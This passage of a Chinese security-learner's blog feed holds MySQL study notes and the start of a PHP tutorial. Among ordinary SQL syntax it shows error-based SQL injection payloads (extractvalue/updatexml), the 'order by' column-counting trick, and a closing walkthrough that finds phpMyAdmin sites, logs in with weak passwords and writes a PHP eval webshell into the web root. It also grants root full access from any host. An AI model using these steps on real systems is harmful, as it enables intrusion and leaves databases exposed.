class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1.查看原始密码：(两种方法)</span><br><span class="line">    1).grep &quot;password&quot; /var/log/mysqld.log</span><br><span class="line">    2).cat /var/log/mysqld.log | grep &quot;password&quot;</span><br><span class="line">    </span><br><span class="line">2.使用原始密码登录：mysql -uroot -p</span><br><span class="line"></span><br><span class="line">3.执行命令：ALTER USER &quot;root&quot;@&quot;localhost&quot; IDENTIFIED BY &quot;你的密码&quot;;</span><br><span class="line"></span><br><span class="line">4.重启服务即可</span><br></pre></td></tr></table></figure><p><strong>重置过密码后忘记密码</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">1.修改配置文件：vi /etc/my.cnf 添加：skip-grant-tables重启MySQL服务</span><br><span class="line"></span><br><span class="line">2.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">3.清空:authentication_string字段,设置对应的host:%</span><br><span class="line">update user set host=&apos;%&apos; where user=&apos;root&apos;;</span><br><span class="line">update user set authentication_string=&apos;&apos; where user=&apos;root&apos;</span><br><span class="line"></span><br><span class="line">4.退出</span><br><span class="line">exit</span><br><span class="line"></span><br><span class="line">5.修改配置文件，注释掉步骤一，重启MySQL服务</span><br><span class="line"></span><br><span class="line">6.空密码登录： mysql -uroot</span><br><span class="line"></span><br><span class="line">7.alter user&apos;root&apos;@&apos;%&apos; IDENTIFIED BY &apos;你的密码@123&apos;;</span><br></pre></td></tr></table></figure><h2 id="允许外界连接的方法"><a href="#允许外界连接的方法" class="headerlink" title="允许外界连接的方法"></a>允许外界连接的方法</h2><ul><li><p>改表法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">进入MySQL，执行以下命令：</span><br><span class="line"></span><br><span class="line">首先要能远程访问，修改root的host为%</span><br><span class="line">update user set host=&apos;%&apos; where user=&apos;root&apos;;</span><br><span class="line">GRANT ALL ON *.* TO &apos;root&apos;@&apos;%&apos;;</span><br><span class="line"></span><br><span class="line">其次，修改连接方式：</span><br><span class="line">ALTER USER &apos;root&apos;@&apos;%&apos; IDENTIFIED WITH mysql_native_password BY &apos;你的数据库密码&apos;;</span><br><span class="line">注意修改防火墙规则或者关闭防火墙</span><br></pre></td></tr></table></figure></li><li><p>授权法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">天将降大任于斯人也，enmmmmmm...交给你去研究了</span><br></pre></td></tr></table></figure></li></ul><h1 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">整型INT</span><br><span class="line"></span><br><span class="line">浮点型   FLOAT</span><br><span class="line"></span><br><span class="line">日期DATEYYYY-MM-DD</span><br><span class="line"></span><br><span class="line">时间TIMEHH-MM-SS</span><br><span class="line"></span><br><span class="line">时间戳   TIMESTAMP</span><br><span class="line"></span><br><span class="line">字符CHAR</span><br><span class="line"> VARCHAR</span><br><span class="line"> </span><br><span class="line">文本TEXT</span><br></pre></td></tr></table></figure><h1 id="MySQL数据库操作"><a href="#MySQL数据库操作" class="headerlink" title="MySQL数据库操作"></a>MySQL数据库操作</h1><p>在MySQL交互式环境中，所有命令必须以英文分号<code>;</code>结束</p><p>MySQL不区分大小写，但是把系统命令和自定义值以大小写区分会便于查看和排错</p><h2 id="显示数据库"><a href="#显示数据库" class="headerlink" title="显示数据库"></a>显示数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW DATABASES;</span><br></pre></td></tr></table></figure><h2 id="创建数据库"><a href="#创建数据库" class="headerlink" title="创建数据库"></a>创建数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">交互式环境：CREATE DATABASE [IF NOT EXISTS] 数据库名 [CHARSET UTF8];</span><br><span class="line">DOS命令行：  mysqladmin -uroot -proot CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><ul><li>IF NOT EXISTS：可选项，如果不存在，则创建数据库</li><li>数据库名：自定义</li><li>CHARSET：设置数据库的默认字符集</li></ul><p><img src="/img/mysql/create_db01.png" alt=""></p><h2 id="删除数据库"><a href="#删除数据库" class="headerlink" title="删除数据库"></a>删除数据库</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP DATABASE [IF EXISTS] 数据库名;</span><br></pre></td></tr></table></figure><h2 id="查看数据库的字符集"><a href="#查看数据库的字符集" class="headerlink" title="查看数据库的字符集"></a>查看数据库的字符集</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW CREATE DATABASE 数据库名;</span><br></pre></td></tr></table></figure><p><img src="/img/mysql/charset01.png" alt=""></p><p>通过MySQL命令修改数据库的字符集</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER DATABASE 数据库名 DEFAULT CHARACTER SET gbk;</span><br></pre></td></tr></table></figure><p><img src="/img/mysql/charset02.png" alt=""></p><h1 id="MySQL数据表操作"><a href="#MySQL数据表操作" class="headerlink" title="MySQL数据表操作"></a>MySQL数据表操作</h1><h2 id="选择数据库"><a href="#选择数据库" class="headerlink" title="选择数据库"></a>选择数据库</h2><p>只有进入数据库里，才能操作数据表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">USE 数据库名;</span><br></pre></td></tr></table></figure><h2 id="显示当前库中所有的数据表"><a href="#显示当前库中所有的数据表" class="headerlink" title="显示当前库中所有的数据表"></a>显示当前库中所有的数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SHOW TABLES;</span><br></pre></td></tr></table></figure><h2 id="创建数据表"><a href="#创建数据表" class="headerlink" title="创建数据表"></a>创建数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CREATE TABLE 表名(字段1 字段1类型 字段1属性,字段2 字段2类型 字段2属性,……)</span><br></pre></td></tr></table></figure><ul><li>字段类型：tinyint、int、bigint、char、varchar、text、date、time等</li><li>字段属性：<ul><li>NOT NULL|NULL：是否可以为空</li><li>DEFAULT default_value：指该列的默认值<ul><li>default_value默认值可以是字符串，也可以是整型</li></ul></li><li>AUTO_INCREMENT：该列为自动增长型，或者自动编号。要求该列必须是整型。<strong>一个表只能有一个auto_increment属性</strong>。</li><li>PRIMARY KEY：主键。指定该列的值具有唯一性，主键所在的列不能为空。<strong>一个表的主键只能有一个</strong>。</li></ul></li></ul><p>一个数据表，由多个列构成。多个列定义之间用英文下的<strong>逗号</strong>隔开。</p><p><img src="/img/mysql/create_tb01.png" alt=""></p><p><img src="/img/mysql/create_tb02.png" alt=""></p><h2 id="删除数据表"><a href="#删除数据表" class="headerlink" title="删除数据表"></a>删除数据表</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DROP TABLE [IF EXISTS] table_name;</span><br></pre></td></tr></table></figure><h2 id="修改数据表"><a href="#修改数据表" class="headerlink" title="修改数据表"></a>修改数据表</h2><p><img src="/img/mysql/alter_tb01.png" alt=""></p><p>这么麻烦的语句，你要用吗？删了在创建一个不就完事儿了</p><h2 id="describe显示表的结构定义"><a href="#describe显示表的结构定义" class="headerlink" title="describe显示表的结构定义"></a>describe显示表的结构定义</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DESCRIBE 表名;或DESC 表名;</span><br></pre></td></tr></table></figure><p><img src="/img/mysql/desc01.png" alt=""></p><h1 id="SQL基础"><a href="#SQL基础" class="headerlink" title="SQL基础"></a>SQL基础</h1><h2 id="增删改查"><a href="#增删改查" class="headerlink" title="增删改查"></a>增删改查</h2><h3 id="增加记录"><a href="#增加记录" class="headerlink" title="增加记录"></a>增加记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO 表名(字段1,字段2,字段3,…) VALUES (值1,值2,值3,…)</span><br></pre></td></tr></table></figure><h3 id="删除记录"><a href="#删除记录" class="headerlink" title="删除记录"></a>删除记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE FROM 表名 [WHERE 条件]</span><br></pre></td></tr></table></figure><p><strong>WHERE条件：如果省略，将删除所有记录</strong></p><h3 id="修改记录"><a href="#修改记录" class="headerlink" title="修改记录"></a>修改记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE 表名 SET 字段1 = 新值1，字段2=新值2,… [WHERE条件]</span><br></pre></td></tr></table></figure><ul><li><p>需要更新的字段列出，不需要更新的不用管它</p></li><li><p>字段的顺序可以修改</p></li><li>WHERE条件不能省略，如果省略，所有记录都会修改</li></ul><h3 id="查询记录"><a href="#查询记录" class="headerlink" title="查询记录"></a>查询记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表|* FROM 表名 [WHERE条件] [ORDER BY排序][LIMIT限制输出]</span><br></pre></td></tr></table></figure><ul><li>字段字列表：查询某些字段的数据，各字段之间用逗号隔开，字段之间没有顺序</li><li><em>：表示显示所有列的数据。如：select </em> from news;</li><li>where：指查询的条件</li><li>ORDER BY：字段排序</li><li>LIMIT：限制输出</li></ul><h2 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h2><h3 id="WHERE"><a href="#WHERE" class="headerlink" title="WHERE"></a>WHERE</h3><p><img src="/img/mysql/where01.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM news WHERE id&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id&lt;100 and hits&lt;100;</span><br><span class="line">SELECT * FROM news WHERE id=100 OR hits&lt;50;</span><br></pre></td></tr></table></figure><h3 id="ORDER-BY"><a href="#ORDER-BY" class="headerlink" title="ORDER BY"></a>ORDER BY</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">order by n如果后面跟数字，是按照第n列数据排序，如果n超过字段数，就报错</span><br><span class="line"></span><br><span class="line">ERROR 1054 (42S22): Unknown column &apos;5&apos; in &apos;order clause&apos;</span><br></pre></td></tr></table></figure><p><strong>由此可判断此表有几列</strong></p><h3 id="LIMIT-限制输出"><a href="#LIMIT-限制输出" class="headerlink" title="LIMIT  限制输出"></a>LIMIT  限制输出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LIMIT startrow,pagesize;</span><br></pre></td></tr></table></figure><ul><li><p>startrow从指定的行数起，开始返回数据</p></li><li><p>pagesize返回的记录数</p></li><li><p>举例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIMIT 0,10;  //从第0行起，返回10条记录</span><br><span class="line">LIMIT 10,10;  //从第10行起，返回10条记录</span><br><span class="line">LIMIT 20,10;  //从第20行起，返回10条记录</span><br></pre></td></tr></table></figure></li></ul><h3 id="LIKE"><a href="#LIKE" class="headerlink" title="LIKE"></a>LIKE</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">通配符：</span><br><span class="line">*表示任意的字符</span><br><span class="line">%表示任意的字符</span><br><span class="line">？   表示一个字符</span><br><span class="line">SELECT * FROM 表名 WHERE 字段名 LIKE &apos;字符串&apos;;其中字符串可用通配符</span><br></pre></td></tr></table></figure><h3 id="UNION-联合查询"><a href="#UNION-联合查询" class="headerlink" title="UNION  联合查询"></a>UNION  联合查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT 字段列表|* FROM 表1 UNION SELECT 字段列表|* FROM 表2;</span><br></pre></td></tr></table></figure><p><strong>表1和表2中字段数应相同</strong></p><h3 id="DISTINCT-去重"><a href="#DISTINCT-去重" class="headerlink" title="DISTINCT  去重"></a>DISTINCT  去重</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  DISTINCT field FROM table_name [WHERE 条件]；</span><br></pre></td></tr></table></figure><h3 id="GROUP-CONCAT-把查询结果链接一起"><a href="#GROUP-CONCAT-把查询结果链接一起" class="headerlink" title="GROUP_CONCAT  把查询结果链接一起"></a>GROUP_CONCAT  把查询结果链接一起</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT  group_concat(DISTINCT field) FROM table_name [WHERE 条件] ；</span><br></pre></td></tr></table></figure><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><ul><li>数据库信息类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">version()  显示数据库版本信息</span><br><span class="line"></span><br><span class="line">connection_id()显示当前连接数</span><br><span class="line"></span><br><span class="line">user()   当前用户（current_user()、system_user()、session_user()）</span><br><span class="line"></span><br><span class="line">database()  查看当前使用的数据库</span><br><span class="line"></span><br><span class="line">schema()  查看当前使用的数据库</span><br><span class="line"></span><br><span class="line">@@hostname  获取当前计算机名称</span><br><span class="line"></span><br><span class="line">@@tmpdir 存放临时文件的路径</span><br><span class="line"></span><br><span class="line">@@datadir存放数据的路径</span><br><span class="line"></span><br><span class="line">@@version数据库版本</span><br><span class="line"></span><br><span class="line">@@basedir数据库所在位置</span><br></pre></td></tr></table></figure><ul><li>字符串操作类</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">mid(string,start,length)   用来截取字符串中一部分</span><br><span class="line"></span><br><span class="line">SUBSTRING（str,start,length）把str从start个字符开始截取length个字符，并输出</span><br><span class="line"></span><br><span class="line">ord()   用来显示字符的ASCII码</span><br><span class="line"></span><br><span class="line">concat()   拼接字符串</span><br><span class="line"></span><br><span class="line">concat_ws()   使用分隔符来拼接字符串</span><br><span class="line">第一个参数是分隔符，支持16进制，不能用单双引号包括</span><br><span class="line">  </span><br><span class="line">group_concat()   和concat类似，拼接并分组显示数据</span><br><span class="line"></span><br><span class="line">INSERT(str1,start,length,str2) 把str1的第start个字符往后的length个字符替换为str2</span><br><span class="line"></span><br><span class="line">LEFT(str,length) 把str从左边开始截取length个字符并输出</span><br><span class="line"></span><br><span class="line">RIGHT(str,length) 把str从右边开始截取length个字符并输出</span><br></pre></td></tr></table></figure><ul><li>其他</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SLEEP(5)让服务器等待5秒后返回0</span><br></pre></td></tr></table></figure><ul><li>报错函数</li></ul><p><strong>extractvalue</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">extractvalue(XML_document，XPath_string):</span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)</span><br><span class="line">作用：从目标XML中返回包含所查询值的字符串</span><br><span class="line">select * from news where tid=1 and extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br></pre></td></tr></table></figure><p><strong>UPDATEXML</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc </span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。 </span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据 </span><br><span class="line">作用：改变文档中符合条件的节点的值</span><br><span class="line">select * from news where tid=1 and (updatexml(1,concat(0x7e,(select user()),0x7e),1));</span><br></pre></td></tr></table></figure><h1 id="导入导出数据"><a href="#导入导出数据" class="headerlink" title="导入导出数据"></a>导入导出数据</h1><h2 id="导入数据"><a href="#导入数据" class="headerlink" title="导入数据"></a>导入数据</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.mysql命令导入mysql -uroot -proot &lt; 文件路径</span><br><span class="line"></span><br><span class="line">2.source命令导入</span><br><span class="line"></span><br><span class="line">3.使用 LOAD DATA 导入数据</span><br></pre></td></tr></table></figure><h2 id="导出数据"><a href="#导出数据" class="headerlink" title="导出数据"></a>导出数据</h2><ul><li>第一种方法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM 表名 INTO OUTFILE &quot;路径+文件名&quot;;</span><br></pre></td></tr></table></figure><p>如果出错，以下为解决办法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ERROR 1290 (HY000): The MySQL server is running with the --secure-file-priv opti</span><br><span class="line">on so it cannot execute this statement</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">执行命令（查看相关配置）：</span><br><span class="line">SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;</span><br><span class="line"></span><br><span class="line">secure_file_priv 为 NULL 时，表示限制mysqld不允许导入或导出。</span><br><span class="line"></span><br><span class="line">secure_file_priv 为 /tmp （路径）时，表示限制mysqld只能在/tmp目录（路径）中执行导入导出，其他目录不能执行。</span><br><span class="line"></span><br><span class="line">secure_file_priv 没有值时，表示不限制mysqld在任意目录的导入导出。</span><br><span class="line"></span><br><span class="line">永久解决办法：</span><br><span class="line">修改配置文件my.ini，添加如下语句：</span><br><span class="line">secure_file_priv=//表示可导入导出到任意目录</span><br><span class="line"></span><br><span class="line">临时解决办法：</span><br><span class="line">set global secure_file_priv=&apos;&apos;;</span><br></pre></td></tr></table></figure><ul><li>第二种方法</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysqldump -uroot -p db_name &gt; ./db_name.sql在DOS命令下运行</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 &gt; 导出的文件名</span><br><span class="line"></span><br><span class="line">mysqldump -u 用户名 -p 数据库名 表名 &gt; 导出的文件名</span><br></pre></td></tr></table></figure><h1 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h1><p><img src="/img/mysql/caidan01.jpg" alt="img"></p><h2 id="通过phpmyadmin来getshell"><a href="#通过phpmyadmin来getshell" class="headerlink" title="通过phpmyadmin来getshell"></a>通过phpmyadmin来getshell</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1. 首先通过google hacking找到phpmyadmin的网站</span><br><span class="line"></span><br><span class="line">2. 弱口令登录，SHOW GLOBAL VARIABLES LIKE &apos;%secure_file_priv%&apos;;判断我们有没有权限去写木马文件</span><br><span class="line"></span><br><span class="line">3. 执行SQL语句，查看数据库所在位置：select @@basedir;</span><br><span class="line"></span><br><span class="line">4. 猜测根目录写入木马文件：`select  &apos;&lt;?php eval($_POST[_]);?&gt;&apos; into outfile &apos;G;//shell.php&apos;`：注意：写木马的路径，一般是`/var/www/html`</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数据库&quot;&gt;&lt;a href=&quot;#数据库&quot; class=&quot;headerlink&quot; title=&quot;数据库&quot;&gt;&lt;/a&gt;数据库&lt;/h1&gt;&lt;p&gt;数据库即存储数据的仓库，是一个管理数据的软件&lt;/p&gt;
&lt;h2 id=&quot;数据库模型&quot;&gt;&lt;a href=&quot;#数据库模型&quot; class=&quot;
      
    
    </summary>
    
    
      <category term="mysql,笔记" scheme="https://clancyb00m.github.io/tags/mysql-%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>PHP文件包含、cookie、文件上传</title>
    <link href="https://clancyb00m.github.io/2018/12/18/PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E3%80%81cookie%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <id>https://clancyb00m.github.io/2018/12/18/PHP文件包含、cookie、文件上传/</id>
    <published>2018-12-18T11:34:00.000Z</published>
    <updated>2018-12-30T10:47:27.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PHP文件包含、cookie、文件上传"><a href="#PHP文件包含、cookie、文件上传" class="headerlink" title="PHP文件包含、cookie、文件上传"></a>PHP文件包含、cookie、文件上传</h1><h2 id="一、文件包含"><a href="#一、文件包含" class="headerlink" title="一、文件包含"></a>一、文件包含</h2><p>在 PHP 中，可以在服务器执行 PHP 文件之前在该文件中插入一个文件的内容。</p><p><strong>include</strong> 和 <strong>require</strong> 语句用于在执行流中插入写在其他文件中的有用的代码。</p><p>两者之间的区别在于：</p><p><strong>include</strong>生成一个警告，在错误发生后依然会执行。</p><p><strong>require</strong>生成一个致命错误，在错误发生时就会停止执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include &apos;head.php&apos;;  include会在PHP文件开始运行的时候包含</span><br><span class="line"></span><br><span class="line">require &apos;tail.php&apos;;  require会在PHP文件运行到require关键字时包含</span><br></pre></td></tr></table></figure><p>include_once和require_once表示只包含一次</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include_once &apos;head.php&apos;;</span><br><span class="line"></span><br><span class="line">require_once &apos;tail.php&apos;;</span><br></pre></td></tr></table></figure><h2 id="二、cookie和session"><a href="#二、cookie和session" class="headerlink" title="二、cookie和session"></a>二、cookie和session</h2><h3 id="2-1cookie"><a href="#2-1cookie" class="headerlink" title="2.1cookie"></a>2.1cookie</h3><p><strong>cookie</strong> 常用于识别用户。cookie 是一种服务器留在用户计算机上的小文件。每当同一台计算机通过浏览器请求页面时，这台计算机将会发送 cookie。通过 PHP，您能够创建并取回 cookie 的值。</p><p><strong>setcookie()</strong>函数用来设置cookie </p><p>注意：setcookie()函数必须位于<code>&lt;html&gt;</code>标签之前。</p><p>创建一个名为 “user” 的 cookie，并为它赋值 “runoob”。并规定了此 cookie 在一小时后过期： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">setcookie(&quot;user&quot;, &quot;runoob&quot;, time()+3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2-1-1取回cookie值"><a href="#2-1-1取回cookie值" class="headerlink" title="2.1.1取回cookie值"></a>2.1.1取回cookie值</h3><p><strong>$_COOKIE</strong> 变量用于取回 cookie 的值。</p><p> 取回名为 “user” 的 cookie 的值，并把它显示在了页面上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 输出 cookie 值</span><br><span class="line">echo $_COOKIE[&quot;user&quot;];</span><br><span class="line"></span><br><span class="line">// 查看所有 cookie</span><br><span class="line">print_r($_COOKIE);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2-1-2删除cookie"><a href="#2-1-2删除cookie" class="headerlink" title="2.1.2删除cookie"></a>2.1.2删除cookie</h3><p>删除cookie很简单，只要将日期改为过去的时间点。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 设置 cookie 过期时间为过去 1 小时</span><br><span class="line">setcookie(&quot;user&quot;, &quot;&quot;, time()-3600);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2session"><a href="#2-2session" class="headerlink" title="2.2session"></a>2.2session</h3><p><strong>Session</strong> 变量用于存储关于用户会话（session）的信息，或者更改用户会话（session）的设置。Session 变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的。</p><p> 在把用户信息存储到 PHP session 中之前，首先必须启动会话。</p><p>注意：session_start() 函数必须位于<code>&lt;html&gt;</code> 标签之前：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php session_start(); ?&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-1存储session"><a href="#2-2-1存储session" class="headerlink" title="2.2.1存储session"></a>2.2.1存储session</h3><p>存储和取回 session 变量的方法是使用 PHP $_SESSION 变量： </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// 存储 session 数据</span><br><span class="line">$_SESSION[&apos;views&apos;]=1;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">// 检索 session 数据</span><br><span class="line">echo &quot;检索&quot;. $_SESSION[&apos;views&apos;];</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h3 id="2-2-2删除session"><a href="#2-2-2删除session" class="headerlink" title="2.2.2删除session"></a>2.2.2删除session</h3><p>删除session数据，可以使用 session_destroy() 函数。</p><p>session_destroy() 函数是彻底销毁 session </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 